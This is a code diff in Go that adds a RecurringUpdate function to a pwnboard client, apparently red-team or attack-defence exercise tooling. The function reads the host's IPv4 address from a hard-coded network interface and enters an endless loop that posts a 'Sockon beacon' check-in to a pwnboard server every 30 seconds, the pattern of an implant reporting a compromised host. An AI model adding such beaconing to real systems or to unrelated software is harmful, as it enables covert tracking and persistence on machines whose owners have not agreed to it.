@@ -4,8 +4,11 @@ import (
 	"bytes"
 	"encoding/json"
 	"fmt"
+	"net"
 	"net/http"
 	"os"
+	"strings"
+	"time"
 )
 
 // This should be the URL/IP of the pwnboard/instance that SendUpdate
@@ -15,6 +18,37 @@ var PWNBOARD, err = os.LookupEnv("PWNBOARD")
 type Data struct {
 	IPs  string `json:"ip"`   // Target IP address as a string
 	Type string `json:"type"` // Describes what implant pwnboard is being updated from
+}
+
+func RecurringUpdate() {
+	var address string
+
+	if interfaces, err := net.Interfaces(); err == nil {
+		for _, interfac := range interfaces {
+			if interfac.HardwareAddr.String() != "" {
+				if strings.Index(interfac.Name, "wlp115s0") == 0 {
+					// Replace string that specifies interface
+					//when running on other devices
+					if addrs, err := interfac.Addrs(); err == nil {
+						for _, addr := range addrs {
+							if addr.Network() == "ip+net" {
+								pr := strings.Split(addr.String(), "/")
+								if len(pr) == 2 && len(strings.Split(pr[0], ".")) == 4 {
+									address = pr[0]
+								}
+							}
+						}
+					}
+				}
+			}
+		}
+	}
+	fmt.Println(address)
+
+	for true {
+		SendUpdate(address, "Sockon beacon")
+		time.Sleep(30 * time.Second)
+	}
 }
 
 // Sends a post request with information about a target to pwnboard.
